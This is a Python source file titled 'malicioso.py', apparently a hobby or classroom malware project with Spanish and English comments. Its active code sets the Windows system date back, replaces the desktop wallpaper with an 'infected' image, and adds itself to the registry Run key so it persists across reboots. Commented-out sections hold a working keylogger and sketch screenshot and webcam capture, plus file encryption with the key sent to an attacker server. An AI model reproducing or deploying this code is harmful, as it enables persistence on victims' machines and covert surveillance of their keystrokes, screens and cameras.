import shutil
import os
import schedule
import time
import time
import threading
import pyautogui
import keyboard
import requests
import pygetwindow as gw
import keyboard
import smtplib
import winreg
from datetime import datetime, timedelta
# import pygetkey as gk
import cv2

current_path = os.getcwd()
file_name = "malicioso.py"
software_path = os.path.join(current_path, file_name)

# 1. Copy malware to \\%windows%\DOWNLOAD at a specific date and time
def copy_software(): 
    download_folder = os.path.expandvars("%USERPROFILE%\\Downloads")
    shutil.copy2(software_path, download_folder)

# 2. Cuando usuario reinicie el equipo, el malware modifique la fecha y hora del sistema, 
# atrasándole un día y cambie el fondo de pantallas 
# por una imagen que diga “USTED HA SIDO INFECTADO”
def modify_system():
    fecha_actual = datetime.now()
    date_to_set = (fecha_actual - timedelta(days=1)).strftime('%d-%m-%Y') # Format: 'MM-DD-YYYY'
    time_to_set = fecha_actual.strftime('%H:%M:%S')  # Format: 'HH:MM:SS'
    wallpaper_name = "wallpaperMalicioso.jpeg"
    wallpaper_path = os.path.join(current_path, wallpaper_name)
    system_date_cmd = "date " + date_to_set
    system_time_cmd = "time " + time_to_set
    set_wallpaper_cmd = 'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{}" /f'.format(wallpaper_path)

    os.system(system_date_cmd)
    os.system(system_time_cmd)
    os.system(set_wallpaper_cmd)
    os.system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "malicioso.py", 0, winreg.REG_SZ, software_path)
    winreg.CloseKey(key)

# # 3. Display multiple screens saying "usted ha sido infectado por un malware divertido" and slow down input devices
# def display_screens():
#     message = "usted ha sido infectado por un malware divertido"
#     screens = "<number_of_screens>"  # Specify the number of screens to display the message

#     for _ in range(screens):
#         print(message)
    
#     keyboard.hook(lambda _: None)
#     mouse = pyautogui.FAILSAFE
#     mouse.FAILSAFE = False

# # 4. Encrypt files in the specified path and send the encryption key to the attacker's server
# def encrypt_files():
#     encryption_key = "<encryption_key>"
#     files_to_encrypt = "<path_to_files>"
#     attacker_server = "<attacker_server>"

#     # Encrypt the files using the encryption key
    
#     # Send the encryption key to the attacker's server using the most convenient method

# # 5. Take screenshots every 1 minute, capture keystrokes every 10 seconds, and send them to the attacker's server
# def capture_information():
#     screenshots_folder = "<screenshots_folder>"
#     attacker_server = "<attacker_server>"

#     def capture_screenshots():
#         while True:
#             # Take a screenshot
#             screenshot = pyautogui.screenshot()
#             screenshot.save(os.path.join(screenshots_folder, f"screenshot_{time.time()}.png"))

#             time.sleep(60)  # Capture a screenshot every 1 minute

#     def capture_keystrokes():
#         while True:
#             # Capture keystrokes
#             keystrokes = gk.get_keys(interval=10, blocking=False)
#             # Send the captured keystrokes to the attacker's server using the most convenient method
#     def capture_keystrokes():
#         keystrokes = ""
#         stop_key_combination = ["k"]
#         sal = False
#         while True:
#             event = keyboard.read_event()
            
#             # Verificar si se presiona la combinación para detener el keylogger
#             if event.event_type == keyboard.KEY_DOWN and event.name == "w":
#                 while True:
#                     a = 0
#                     event2 = keyboard.read_event()
#                     if event2.event_type == keyboard.KEY_DOWN and event2.name == 'k':
#                         print ("Keylogger detenido. Las pulsaciones se guardaron en keylog.txt")
#                         sal = True
#                         a = 1
#                     elif event2.event_type == keyboard.KEY_DOWN:
#                         if event.name == "space":
#                             keystrokes += " "
#                             print("Espacio encontrado2.00")
#                         else:
#                             keystrokes += event.name
#                             print("Letra encontrada2.0000")
#                         a = 1
#                     if a == 1:
#                         break
#             if(sal == True):
#                 break
#             if event.event_type == keyboard.KEY_DOWN:
#                 if event.name == "space":
#                     keystrokes += " "
#                     print("Espacio encontrado")
#                 else:
#                     keystrokes += event.name
#                     print("Letra encontrada")

#         with open("keylog.txt", "w") as file:
#             file.write(keystrokes)
#             print("Keylogger detenido. Las USTED HA SIDO INFECTADO POR UN KEYLOGGER DESARROLLADO POR RADIATION WASCALS")

#     # Start capturing screenshots and keystrokes in separate threads
#     threading.Thread(target=capture_screenshots).start()
#     threading.Thread(target=capture_keystrokes).start()

# # 6. Attempt to activate the camera, take a photo, and send it to the attacker's server
# def activate_camera():
#     attacker_server = "<attacker_server>"

#     # Attempt to activate the camera
#     camera = cv2.VideoCapture(0)
#     if camera.isOpened():
#         # Capture a photo
#         ret, frame = camera.read()
#         if ret:
#             # Save the photo
#             photo_path = "<path_to_save_photo>"
#             cv2.imwrite(photo_path, frame)
#             # Send the photo to the attacker's server using the most convenient method

#     camera.release()

# # Execute the functions according to user input
# def execute_commands():
#     keyboard.add_hotkey("ctrl+c", display_screens)
#     keyboard.add_hotkey("ctrl+v", capture_information)
#     keyboard.add_hotkey("ctrl+x", activate_camera)

#     while True:
#         if keyboard.is_pressed("ctrl"):
#             if keyboard.is_pressed("c"):
#                 display_screens()
#             elif keyboard.is_pressed("v"):
#                 capture_information()
#             elif keyboard.is_pressed("x"):
#                 activate_camera()

if __name__ == "__main__":
    # fecha_hora_ejecucion = None
    # minutos_despues = 2

    # # Verifica si se proporcionó una fecha y hora específica
    # if fecha_hora_ejecucion:
    #     # Convierte la fecha y hora en formato de cadena a un objeto datetime
    #     fecha_hora_ejecucion = datetime.strptime(fecha_hora_ejecucion, "%Y-%m-%d %H:%M:%S")
    # else:
    #     print('este es')
    #     # Calcula la fecha y hora de ejecución sumando los minutos deseados a la hora actual
    #     fecha_hora_ejecucion = datetime.now() + timedelta(minutes=minutos_despues)

    # # Obtiene la diferencia de tiempo entre la fecha y hora de ejecución y la hora actual
    # tiempo_espera = (fecha_hora_ejecucion - datetime.now()).total_seconds()

    # # Verifica si la diferencia de tiempo es negativa (es decir, la fecha y hora de ejecución ya ha pasado)
    # if tiempo_espera < 0:
    #     print("La fecha y hora de ejecución ya ha pasado.")
    # else:
    #     # Espera el tiempo necesario antes de ejecutar la función
    #     time.sleep(tiempo_espera)

    #     # Ejecuta la función copy_software()
    #     copy_software()

    modify_system()

